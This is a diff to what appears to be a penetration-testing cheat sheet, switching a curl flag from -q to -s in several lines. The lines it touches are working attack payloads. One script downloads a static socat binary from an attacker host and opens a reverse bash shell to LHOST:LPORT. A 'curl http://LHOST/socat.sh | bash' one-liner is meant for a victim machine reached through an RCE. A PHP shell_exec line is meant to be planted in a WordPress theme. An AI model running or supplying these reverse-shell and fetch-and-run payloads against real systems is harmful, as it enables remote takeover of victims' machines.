@@ -38,7 +38,7 @@ where `LHOST` has to be replaced with attacker's IP.
     DIR=/tmp # maybe also this
 
     # choose between curl or wget
-    curl -q http://$LHOST/socat -o $DIR/socat
+    curl -s http://$LHOST/socat -o $DIR/socat
     #wget -q http://$LHOST/socat -O $DIR/socat
     chmod +x $DIR/socat
     $DIR/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT
@@ -46,7 +46,7 @@ where `LHOST` has to be replaced with attacker's IP.
 3. You also have to serve a static version of `socat` you'll find [there](https://github.com/andrew-d/static-binaries/tree/master/binaries).
 4. Then, on the victim's machine, via the RCE you discovered:
     ```bash
-    curl -q http://LHOST/socat.sh | bash
+    curl -s http://LHOST/socat.sh | bash
     ```
     or
     ```bash
@@ -55,5 +55,5 @@ where `LHOST` has to be replaced with attacker's IP.
     
 In a Wordpress theme PHP file, it could looks like this:
 ```php
-shell_exec("curl -q http://LHOST/socat.sh | bash");
+shell_exec("curl -s http://LHOST/socat.sh | bash");
 ```
